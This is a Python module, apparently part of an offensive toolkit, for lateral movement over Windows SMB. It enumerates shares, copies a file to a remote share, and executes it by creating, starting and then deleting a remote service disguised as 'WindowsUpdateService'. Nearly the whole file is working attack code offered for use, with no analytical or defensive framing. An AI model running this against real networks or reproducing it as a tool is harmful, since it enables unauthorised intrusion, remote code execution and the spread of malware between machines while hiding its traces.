#!/usr/bin/env python3
"""
SMB Lateral Movement Module
Uses Windows file sharing to move between systems
"""

import subprocess
import os
import tempfile

class SMBLateralMovement:
    def __init__(self):
        self.shared_folders = []
    
    def discover_shares(self, target_ip):
        """Discover SMB shares on target"""
        print(f"[*] Discovering SMB shares on {target_ip}...")
        
        commands = [
            f'net view \\\\{target_ip}',
            f'nmblookup -A {target_ip}',
        ]
        
        shares = []
        for cmd in commands:
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                print(f"[*] Command: {cmd}")
                print(f"[*] Output: {result.stdout[:200]}...")
                
                # Parse shares from net view output
                if 'net view' in cmd:
                    for line in result.stdout.split('\\n'):
                        if 'Disk' in line or 'IPC' in line:
                            parts = line.split()
                            if parts:
                                share_name = parts[0]
                                shares.append(share_name)
                                print(f"[+] Found share: {share_name}")
                
            except Exception as e:
                print(f"[-] Command failed: {cmd} - {e}")
                continue
        
        return list(set(shares))  # Remove duplicates
    
    def check_share_access(self, target_ip, share_name):
        """Check if we have access to a share"""
        try:
            # Try to list directory
            test_path = f"\\\\{target_ip}\\{share_name}"
            result = subprocess.run(f'dir "{test_path}"', shell=True, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                print(f"[+] Access granted to {share_name}")
                return True
            else:
                print(f"[-] No access to {share_name}")
                return False
                
        except Exception as e:
            print(f"[-] Error checking access: {e}")
            return False
    
    def copy_file_via_smb(self, local_file, target_ip, share_name, remote_path=""):
        """Copy file to target via SMB share"""
        print(f"[*] Attempting to copy {local_file} to {target_ip}\\{share_name}...")
        
        try:
            remote_path = f"\\\\{target_ip}\\{share_name}\\{remote_path}\\{os.path.basename(local_file)}"
            cmd = f'copy "{local_file}" "{remote_path}"'
            
            print(f"[*] Executing: {cmd}")
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"[+] File copied successfully to {remote_path}")
                return f"File copied to {remote_path}"
            else:
                print(f"[-] Copy failed: {result.stderr}")
                return f"Copy failed: {result.stderr}"
                
        except Exception as e:
            print(f"[-] Error during copy: {e}")
            return f"Error: {e}"
    
    def execute_via_service(self, target_ip, share_name, remote_file):
        """Execute file via service creation"""
        print(f"[*] Attempting service-based execution on {target_ip}...")
        
        try:
            service_name = "WindowsUpdateService"
            remote_path = f"\\\\{target_ip}\\{share_name}\\{remote_file}"
            
            # Create service on remote machine
            create_cmd = f'sc \\\\{target_ip} create "{service_name}" binPath= "{remote_path}" start= demand'
            print(f"[*] Creating service: {create_cmd}")
            
            result = subprocess.run(create_cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"[+] Service created successfully")
                
                # Start the service
                start_cmd = f'sc \\\\{target_ip} start "{service_name}"'
                subprocess.run(start_cmd, shell=True, capture_output=True)
                
                # Clean up - delete service
                delete_cmd = f'sc \\\\{target_ip} delete "{service_name}"'
                subprocess.run(delete_cmd, shell=True, capture_output=True)
                
                print(f"[+] Service execution completed and cleaned up")
                return "Command executed via service"
            else:
                print(f"[-] Service creation failed: {result.stderr}")
                return f"Service creation failed: {result.stderr}"
                
        except Exception as e:
            print(f"[-] Error in service execution: {e}")
            return f"Error: {e}"

# Test function
def test_smb():
    """Test SMB functionality"""
    smb = SMBLateralMovement()
    
    # Test with localhost (your own machine)
    test_ip = "127.0.0.1"
    print(f"Testing SMB with {test_ip}...")
    
    shares = smb.discover_shares(test_ip)
    print(f"Shares found: {shares}")
    
    if shares:
        # Test access to first share
        access = smb.check_share_access(test_ip, shares[0])
        print(f"Access to {shares[0]}: {access}")

if __name__ == "__main__":
    test_smb()
